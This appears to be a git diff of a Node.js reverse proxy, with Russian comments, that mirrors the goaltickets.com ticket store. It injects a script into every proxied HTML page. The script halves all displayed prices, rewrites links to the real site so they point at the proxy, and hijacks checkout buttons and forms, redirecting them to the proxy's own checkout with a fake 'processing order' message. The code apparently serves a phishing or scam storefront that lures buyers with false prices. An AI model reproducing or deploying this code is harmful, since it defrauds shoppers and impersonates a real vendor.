@@ -134,6 +134,17 @@ app.get('*checkout*', (req, res) => {
       next();
     });
 
+    // Проксируем все внешние домены
+    app.get('/cdnwidget/*', (req, res, next) => {
+      console.log('📦 CDN Widget intercepted:', req.url);
+      next();
+    });
+
+    app.get('/cdn/shopifycloud/*', (req, res, next) => {
+      console.log('📦 Shopify Cloud intercepted:', req.url);
+      next();
+    });
+
     // Проксируем все AJAX запросы к корзине
     app.post('/cart/add.js', (req, res, next) => {
       console.log('🛒 Cart add.js intercepted:', req.url);
@@ -352,17 +363,17 @@ const proxyOptions = {
           return;
         }
         
-        // Инжектируем скрипт перехвата checkout
-    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
-      let body = '';
-      proxyRes.on('data', (chunk) => {
-        body += chunk;
-      });
-      
-      proxyRes.on('end', () => {
-        // Изменяем цены в HTML - делим на 2
-        let modifiedBody = body;
-        
+        // Перехватываем HTML ответы для изменения цен
+        if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
+          let body = '';
+          proxyRes.on('data', (chunk) => {
+            body += chunk;
+          });
+          
+          proxyRes.on('end', () => {
+            // Изменяем цены в HTML - делим на 2
+            let modifiedBody = body;
+            
             // Агрессивный поиск и замена цен
             console.log('💰 Starting aggressive price modification...');
             
@@ -435,176 +446,176 @@ const proxyOptions = {
                 return match;
               });
             });
-        
-        // Добавляем скрипт перехвата перед закрывающим тегом </body>
-        const checkoutScript = `
-          <script>
-            // 🎯 CHECKOUT INTERCEPTOR
-            (function() {
-              console.log('🎯 Checkout Interceptor loaded');
-              
-              function interceptCheckoutClicks() {
-                document.addEventListener('click', function(event) {
-                  const target = event.target;
-                  const text = target.textContent?.toLowerCase() || '';
-                  const href = target.href || '';
-                  const form = target.closest('form');
+            
+            // Добавляем скрипт перехвата перед закрывающим тегом </body>
+            const checkoutScript = `
+              <script>
+                // 🎯 CHECKOUT INTERCEPTOR
+                (function() {
+                  console.log('🎯 Checkout Interceptor loaded');
                   
-                  // Перехватываем все checkout кнопки и ссылки
-                  if (text.includes('checkout') || text.includes('купить') || 
-                      text.includes('оформить') || href.includes('checkout') ||
-                      target.classList.contains('checkout') || target.id.includes('checkout') ||
-                      (form && form.action && form.action.includes('cart')) ||
-                      // Перехватываем внешние ссылки на goaltickets.com/checkout
-                      href.includes('goaltickets.com/checkout') ||
-                      href.includes('goaltickets.com/cart') ||
-                      // Перехватываем любые ссылки содержащие checkout
-                      (href && (href.includes('/checkout') || href.includes('/cart')))) {
-                    
-                    console.log('🎯 Checkout button clicked:', target, 'href:', href);
-                    event.preventDefault();
-                    event.stopPropagation();
-                    
-                    // Показываем уведомление
-                    const notification = document.createElement('div');
-                    notification.innerHTML = \`
-                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
-                        Перенаправляем на checkout...
-                      </div>
-                    \`;
-                    document.body.appendChild(notification);
-                    
-                    setTimeout(() => {
-                      window.location.href = '/checkout';
-                    }, 500);
-                    
-                    return false;
-                  }
-                });
-              }
-              
-              // Перехватываем формы
-              function interceptForms() {
-                document.addEventListener('submit', function(event) {
-                  const form = event.target;
-                  const action = form.action?.toLowerCase() || '';
-                  
-                  if (action.includes('checkout')) {
-                    console.log('🎯 Checkout form submission intercepted:', form);
-                    event.preventDefault();
-                    event.stopPropagation();
-                    
-                    const notification = document.createElement('div');
-                    notification.innerHTML = \`
-                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
-                        Обрабатываем заказ...
-                      </div>
-                    \`;
-                    document.body.appendChild(notification);
-                    
-                    setTimeout(() => {
-                      window.location.href = '/checkout';
-                    }, 1000);
-                    
-                    return false;
-                  }
-                  // Для cart форм - не перехватываем, позволяем работать нормально
-                });
-              }
-              
-              if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', function() {
-                  interceptCheckoutClicks();
-                  interceptForms();
-                });
-              } else {
-                interceptCheckoutClicks();
-                interceptForms();
-              }
-              
-              // Дополнительная проверка
-              setTimeout(() => {
-                interceptCheckoutClicks();
-                interceptForms();
-              }, 2000);
-              
-              // Перехватываем все ссылки на checkout при загрузке страницы
-              function interceptAllCheckoutLinks() {
-                const links = document.querySelectorAll('a[href*="checkout"], a[href*="cart"], button[onclick*="checkout"], button[onclick*="cart"]');
-                links.forEach(link => {
-                  if (link.href && (link.href.includes('checkout') || link.href.includes('cart'))) {
-                    console.log('🎯 Found checkout link:', link);
-                    link.addEventListener('click', function(e) {
-                      e.preventDefault();
-                      e.stopPropagation();
-                      console.log('🎯 Checkout link clicked:', link.href);
-                      window.location.href = '/checkout';
-                      return false;
+                  function interceptCheckoutClicks() {
+                    document.addEventListener('click', function(event) {
+                      const target = event.target;
+                      const text = target.textContent?.toLowerCase() || '';
+                      const href = target.href || '';
+                      const form = target.closest('form');
+                      
+                      // Перехватываем все checkout кнопки и ссылки
+                      if (text.includes('checkout') || text.includes('купить') || 
+                          text.includes('оформить') || href.includes('checkout') ||
+                          target.classList.contains('checkout') || target.id.includes('checkout') ||
+                          (form && form.action && form.action.includes('cart')) ||
+                          // Перехватываем внешние ссылки на goaltickets.com/checkout
+                          href.includes('goaltickets.com/checkout') ||
+                          href.includes('goaltickets.com/cart') ||
+                          // Перехватываем любые ссылки содержащие checkout
+                          (href && (href.includes('/checkout') || href.includes('/cart')))) {
+                        
+                        console.log('🎯 Checkout button clicked:', target, 'href:', href);
+                        event.preventDefault();
+                        event.stopPropagation();
+                        
+                        // Показываем уведомление
+                        const notification = document.createElement('div');
+                        notification.innerHTML = \`
+                          <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
+                            Перенаправляем на checkout...
+                          </div>
+                        \`;
+                        document.body.appendChild(notification);
+                        
+                        setTimeout(() => {
+                          window.location.href = '/checkout';
+                        }, 500);
+                        
+                        return false;
+                      }
                     });
                   }
-                });
-              }
-              
-              // Запускаем перехват ссылок
-              setTimeout(interceptAllCheckoutLinks, 1000);
-              setTimeout(interceptAllCheckoutLinks, 3000);
-              
-              // 🎯 ПЕРЕХВАТ ВСЕХ ССЫЛОК НА СОБЫТИЯ
-              function interceptEventLinks() {
-                console.log('🔗 Intercepting event links...');
-                
-                // Перехватываем все ссылки на события
-                document.addEventListener('click', function(event) {
-                  const target = event.target;
-                  const href = target.href || target.closest('a')?.href;
                   
-                  if (href) {
-                    // Если ссылка ведет на goaltickets.com
-                    if (href.includes('goaltickets.com')) {
-                      console.log('🔗 Event link intercepted:', href);
-                      event.preventDefault();
-                      event.stopPropagation();
+                  // Перехватываем формы
+                  function interceptForms() {
+                    document.addEventListener('submit', function(event) {
+                      const form = event.target;
+                      const action = form.action?.toLowerCase() || '';
                       
-                      // Извлекаем путь после домена
-                      const url = new URL(href);
-                      const path = url.pathname + url.search + url.hash;
-                      
-                      // Перенаправляем на наш прокси
-                      window.location.href = path;
-                      return false;
-                    }
-                    
-                    // Если ссылка ведет на события (products, collections)
-                    if (href.includes('/products/') || href.includes('/collections/') || 
-                        href.includes('/events/') || href.includes('/tickets/')) {
-                      console.log('🔗 Event page link intercepted:', href);
-                      event.preventDefault();
-                      event.stopPropagation();
-                      
-                      // Перенаправляем на наш прокси
-                      window.location.href = href;
-                      return false;
-                    }
+                      if (action.includes('checkout')) {
+                        console.log('🎯 Checkout form submission intercepted:', form);
+                        event.preventDefault();
+                        event.stopPropagation();
+                        
+                        const notification = document.createElement('div');
+                        notification.innerHTML = \`
+                          <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
+                            Обрабатываем заказ...
+                          </div>
+                        \`;
+                        document.body.appendChild(notification);
+                        
+                        setTimeout(() => {
+                          window.location.href = '/checkout';
+                        }, 1000);
+                        
+                        return false;
+                      }
+                      // Для cart форм - не перехватываем, позволяем работать нормально
+                    });
                   }
-                });
-                
-                // Также перехватываем все ссылки при загрузке страницы
-                const allLinks = document.querySelectorAll('a[href]');
-                allLinks.forEach(link => {
-                  const href = link.href;
                   
-                  if (href.includes('goaltickets.com')) {
-                    // Извлекаем путь после домена
-                    const url = new URL(href);
-                    const path = url.pathname + url.search + url.hash;
-                    
-                    // Обновляем href на наш прокси
-                    link.href = path;
-                    console.log('🔗 Link updated:', href, '->', path);
+                  if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', function() {
+                      interceptCheckoutClicks();
+                      interceptForms();
+                    });
+                  } else {
+                    interceptCheckoutClicks();
+                    interceptForms();
                   }
-                });
-              }
-              
+                  
+                  // Дополнительная проверка
+                  setTimeout(() => {
+                    interceptCheckoutClicks();
+                    interceptForms();
+                  }, 2000);
+                  
+                  // Перехватываем все ссылки на checkout при загрузке страницы
+                  function interceptAllCheckoutLinks() {
+                    const links = document.querySelectorAll('a[href*="checkout"], a[href*="cart"], button[onclick*="checkout"], button[onclick*="cart"]');
+                    links.forEach(link => {
+                      if (link.href && (link.href.includes('checkout') || link.href.includes('cart'))) {
+                        console.log('🎯 Found checkout link:', link);
+                        link.addEventListener('click', function(e) {
+                          e.preventDefault();
+                          e.stopPropagation();
+                          console.log('🎯 Checkout link clicked:', link.href);
+                          window.location.href = '/checkout';
+                          return false;
+                        });
+                      }
+                    });
+                  }
+                  
+                  // Запускаем перехват ссылок
+                  setTimeout(interceptAllCheckoutLinks, 1000);
+                  setTimeout(interceptAllCheckoutLinks, 3000);
+                  
+                  // 🎯 ПЕРЕХВАТ ВСЕХ ССЫЛОК НА СОБЫТИЯ
+                  function interceptEventLinks() {
+                    console.log('🔗 Intercepting event links...');
+                    
+                    // Перехватываем все ссылки на события
+                    document.addEventListener('click', function(event) {
+                      const target = event.target;
+                      const href = target.href || target.closest('a')?.href;
+                      
+                      if (href) {
+                        // Если ссылка ведет на goaltickets.com
+                        if (href.includes('goaltickets.com')) {
+                          console.log('🔗 Event link intercepted:', href);
+                          event.preventDefault();
+                          event.stopPropagation();
+                          
+                          // Извлекаем путь после домена
+                          const url = new URL(href);
+                          const path = url.pathname + url.search + url.hash;
+                          
+                          // Перенаправляем на наш прокси
+                          window.location.href = path;
+                          return false;
+                        }
+                        
+                        // Если ссылка ведет на события (products, collections)
+                        if (href.includes('/products/') || href.includes('/collections/') || 
+                            href.includes('/events/') || href.includes('/tickets/')) {
+                          console.log('🔗 Event page link intercepted:', href);
+                          event.preventDefault();
+                          event.stopPropagation();
+                          
+                          // Перенаправляем на наш прокси
+                          window.location.href = href;
+                          return false;
+                        }
+                      }
+                    });
+                    
+                    // Также перехватываем все ссылки при загрузке страницы
+                    const allLinks = document.querySelectorAll('a[href]');
+                    allLinks.forEach(link => {
+                      const href = link.href;
+                      
+                      if (href.includes('goaltickets.com')) {
+                        // Извлекаем путь после домена
+                        const url = new URL(href);
+                        const path = url.pathname + url.search + url.hash;
+                        
+                        // Обновляем href на наш прокси
+                        link.href = path;
+                        console.log('🔗 Link updated:', href, '->', path);
+                      }
+                    });
+                  }
+                  
                   // 🎯 ИСПРАВЛЕНИЕ SERVICE WORKER
                   function fixServiceWorker() {
                     // Отключаем Service Worker
@@ -620,89 +631,89 @@ const proxyOptions = {
                   // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
                   function modifyPricesOnPage() {
                     console.log('💰 Modifying prices on page...');
-                
-                // Ищем все элементы с ценами
-                const priceSelectors = [
-                  '[class*="price"]',
-                  '[class*="cost"]',
-                  '[class*="amount"]',
-                  '[data-price]',
-                  'span:contains("$")',
-                  'div:contains("USD")',
-                  'p:contains("$")',
-                  'h1:contains("$")',
-                  'h2:contains("$")',
-                  'h3:contains("$")',
-                  'h4:contains("$")',
-                  'h5:contains("$")',
-                  'h6:contains("$")',
-                  'strong:contains("$")',
-                  'b:contains("$")',
-                  'em:contains("$")',
-                  'i:contains("$")'
-                ];
-                
-                priceSelectors.forEach(selector => {
-                  try {
-                    const elements = document.querySelectorAll(selector);
-                    elements.forEach(element => {
-                      const text = element.textContent || element.innerText || '';
-                      
-                      // Ищем цены в различных форматах
-                      const pricePatterns = [
-                        /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                        /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-                        /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-                        /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                        /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
-                      ];
-                      
-                      pricePatterns.forEach(pattern => {
-                        const matches = text.match(pattern);
-                        if (matches) {
-                          matches.forEach(match => {
-                            const priceMatch = match.match(/(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
-                            if (priceMatch) {
-                              const originalPrice = priceMatch[1];
-                              const cleanPrice = originalPrice.replace(/,/g, '');
-                              const priceValue = parseFloat(cleanPrice);
-                              
-                              if (!isNaN(priceValue) && priceValue > 0) {
-                                const newPrice = Math.round(priceValue / 2 * 100) / 100;
-                                const formattedPrice = newPrice.toLocaleString('en-US', {
-                                  minimumFractionDigits: 2,
-                                  maximumFractionDigits: 2
-                                });
-                                
-                                const newText = text.replace(match, match.replace(originalPrice, formattedPrice));
-                                element.textContent = newText;
-                                console.log('💰 Client price changed:', match, '->', match.replace(originalPrice, formattedPrice));
-                              }
+                    
+                    // Ищем все элементы с ценами
+                    const priceSelectors = [
+                      '[class*="price"]',
+                      '[class*="cost"]',
+                      '[class*="amount"]',
+                      '[data-price]',
+                      'span:contains("$")',
+                      'div:contains("USD")',
+                      'p:contains("$")',
+                      'h1:contains("$")',
+                      'h2:contains("$")',
+                      'h3:contains("$")',
+                      'h4:contains("$")',
+                      'h5:contains("$")',
+                      'h6:contains("$")',
+                      'strong:contains("$")',
+                      'b:contains("$")',
+                      'em:contains("$")',
+                      'i:contains("$")'
+                    ];
+                    
+                    priceSelectors.forEach(selector => {
+                      try {
+                        const elements = document.querySelectorAll(selector);
+                        elements.forEach(element => {
+                          const text = element.textContent || element.innerText || '';
+                          
+                          // Ищем цены в различных форматах
+                          const pricePatterns = [
+                            /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                            /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                            /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+                            /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+                            /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                            /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
+                          ];
+                          
+                          pricePatterns.forEach(pattern => {
+                            const matches = text.match(pattern);
+                            if (matches) {
+                              matches.forEach(match => {
+                                const priceMatch = match.match(/(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
+                                if (priceMatch) {
+                                  const originalPrice = priceMatch[1];
+                                  const cleanPrice = originalPrice.replace(/,/g, '');
+                                  const priceValue = parseFloat(cleanPrice);
+                                  
+                                  if (!isNaN(priceValue) && priceValue > 0) {
+                                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
+                                    const formattedPrice = newPrice.toLocaleString('en-US', {
+                                      minimumFractionDigits: 2,
+                                      maximumFractionDigits: 2
+                                    });
+                                    
+                                    const newText = text.replace(match, match.replace(originalPrice, formattedPrice));
+                                    element.textContent = newText;
+                                    console.log('💰 Client price changed:', match, '->', match.replace(originalPrice, formattedPrice));
+                                  }
+                                }
+                              });
                             }
                           });
-                        }
-                      });
+                        });
+                      } catch (e) {
+                        // Игнорируем ошибки селекторов
+                      }
                     });
-                  } catch (e) {
-                    // Игнорируем ошибки селекторов
+                    
+                    // Также изменяем цены в data атрибутах
+                    const elementsWithDataPrice = document.querySelectorAll('[data-price]');
+                    elementsWithDataPrice.forEach(element => {
+                      const price = element.getAttribute('data-price');
+                      const priceValue = parseFloat(price);
+                      
+                      if (!isNaN(priceValue) && priceValue > 0) {
+                        const newPrice = Math.round(priceValue / 2 * 100) / 100;
+                        element.setAttribute('data-price', newPrice.toString());
+                        console.log('💰 Data price changed:', price, '->', newPrice);
+                      }
+                    });
                   }
-                });
-                
-                // Также изменяем цены в data атрибутах
-                const elementsWithDataPrice = document.querySelectorAll('[data-price]');
-                elementsWithDataPrice.forEach(element => {
-                  const price = element.getAttribute('data-price');
-                  const priceValue = parseFloat(price);
                   
-                  if (!isNaN(priceValue) && priceValue > 0) {
-                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
-                    element.setAttribute('data-price', newPrice.toString());
-                    console.log('💰 Data price changed:', price, '->', newPrice);
-                  }
-                });
-              }
-              
                   // Запускаем перехват ссылок
                   setTimeout(interceptEventLinks, 100);
                   setTimeout(interceptEventLinks, 1000);
@@ -715,84 +726,84 @@ const proxyOptions = {
                   
                   // Исправляем Service Worker
                   setTimeout(fixServiceWorker, 1000);
-              
-              // Агрессивный поиск и изменение цен по всему документу
-              function aggressivePriceModification() {
-                console.log('💰 Aggressive price modification...');
-                
-                // Ищем все текстовые узлы
-                const walker = document.createTreeWalker(
-                  document.body,
-                  NodeFilter.SHOW_TEXT,
-                  null,
-                  false
-                );
-                
-                const textNodes = [];
-                let node;
-                while (node = walker.nextNode()) {
-                  textNodes.push(node);
-                }
-                
-                textNodes.forEach(textNode => {
-                  const text = textNode.textContent;
-                  if (text && text.includes('$')) {
-                    // Ищем цены в тексте
-                    const pricePatterns = [
-                      /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                      /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-                      /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
-                      /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
-                      /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
-                    ];
+                  
+                  // Агрессивный поиск и изменение цен по всему документу
+                  function aggressivePriceModification() {
+                    console.log('💰 Aggressive price modification...');
                     
-                    let modifiedText = text;
-                    pricePatterns.forEach(pattern => {
-                      modifiedText = modifiedText.replace(pattern, (match, price) => {
-                        const cleanPrice = price.replace(/,/g, '');
-                        const priceValue = parseFloat(cleanPrice);
-                        
-                        if (!isNaN(priceValue) && priceValue > 0) {
-                          const newPrice = Math.round(priceValue / 2 * 100) / 100;
-                          const formattedPrice = newPrice.toLocaleString('en-US', {
-                            minimumFractionDigits: 2,
-                            maximumFractionDigits: 2
-                          });
-                          
-                          console.log('💰 Aggressive price changed:', match, '->', match.replace(price, formattedPrice));
-                          return match.replace(price, formattedPrice);
-                        }
-                        return match;
-                      });
-                    });
+                    // Ищем все текстовые узлы
+                    const walker = document.createTreeWalker(
+                      document.body,
+                      NodeFilter.SHOW_TEXT,
+                      null,
+                      false
+                    );
                     
-                    if (modifiedText !== text) {
-                      textNode.textContent = modifiedText;
+                    const textNodes = [];
+                    let node;
+                    while (node = walker.nextNode()) {
+                      textNodes.push(node);
                     }
+                    
+                    textNodes.forEach(textNode => {
+                      const text = textNode.textContent;
+                      if (text && text.includes('$')) {
+                        // Ищем цены в тексте
+                        const pricePatterns = [
+                          /From\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                          /USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+                          /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+                          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
+                          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g
+                        ];
+                        
+                        let modifiedText = text;
+                        pricePatterns.forEach(pattern => {
+                          modifiedText = modifiedText.replace(pattern, (match, price) => {
+                            const cleanPrice = price.replace(/,/g, '');
+                            const priceValue = parseFloat(cleanPrice);
+                            
+                            if (!isNaN(priceValue) && priceValue > 0) {
+                              const newPrice = Math.round(priceValue / 2 * 100) / 100;
+                              const formattedPrice = newPrice.toLocaleString('en-US', {
+                                minimumFractionDigits: 2,
+                                maximumFractionDigits: 2
+                              });
+                              
+                              console.log('💰 Aggressive price changed:', match, '->', match.replace(price, formattedPrice));
+                              return match.replace(price, formattedPrice);
+                            }
+                            return match;
+                          });
+                        });
+                        
+                        if (modifiedText !== text) {
+                          textNode.textContent = modifiedText;
+                        }
+                      }
+                    });
                   }
-                });
-              }
-              
-              // Запускаем агрессивное изменение цен
-              setTimeout(aggressivePriceModification, 1000);
-              setTimeout(aggressivePriceModification, 3000);
-              setTimeout(aggressivePriceModification, 6000);
-            })();
-          </script>
-        `;
-        
-        // Вставляем скрипт перед </body>
-        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
-        
-        if (!res.headersSent) {
-          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
-          res.end(modifiedBody);
+                  
+                  // Запускаем агрессивное изменение цен
+                  setTimeout(aggressivePriceModification, 1000);
+                  setTimeout(aggressivePriceModification, 3000);
+                  setTimeout(aggressivePriceModification, 6000);
+                })();
+              </script>
+            `;
+            
+            // Вставляем скрипт перед </body>
+            modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
+            
+            if (!res.headersSent) {
+              res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
+              res.end(modifiedBody);
+            }
+          });
+          
+          return;
         }
-      });
-      
-      return;
-    }
   },
   onError: (err, req, res) => {
     console.error('Proxy Error:', err.message);
